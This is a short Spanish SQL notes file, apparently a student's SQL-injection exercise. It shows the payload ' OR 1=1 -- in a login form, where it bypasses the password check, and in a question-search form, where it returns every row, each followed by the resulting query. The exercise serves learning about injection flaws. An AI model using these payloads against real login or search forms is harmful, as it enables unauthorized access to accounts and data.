-- primera prueba en la tarea 11.01 de inyección SQL
-- Inyección SQL en login de usuario
' OR 1=1 
--  En usuario y contraseña vacía:

SELECT * from usuario where correo='' OR 1=1 -- ' && contraseña='';

-- en el formulario de buscar pregurta voy a scar todas la prenguntas en vez de una
' OR 1=1 -- 

  SELECT * FROM preguntas WHERE titulo='' OR 1=1 -- '



